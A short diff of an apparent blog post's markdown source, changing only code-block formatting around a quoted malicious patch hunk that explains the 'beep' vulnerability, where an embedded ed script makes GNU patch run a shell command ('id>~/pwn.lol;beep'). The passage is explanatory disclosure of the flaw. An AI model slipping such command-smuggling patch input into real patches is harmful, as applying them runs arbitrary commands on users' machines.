@@ -78,14 +78,14 @@ the problem, advertising it like this:
 So why would your computer beep when it applies a patch? 
 That's another fun thing. The patch contains this hunk:
 
-{% highlight diff %}
+```diff
 --- /dev/null	2018-13-37 13:37:37.000000000 +0100
 +++ b/beep.c	2018-13-37 13:38:38.000000000 +0100
 1337a
 1,112d
 !id>~/pwn.lol;beep # 13-21 12:53:21.000000000 +0100
 .
-{% endhighlight %}
+```
 
 and that looks very much like an ed-script. In fact, until recently that is
 exactly what patch did: popen a copy of ed and feed it. The line "id \>
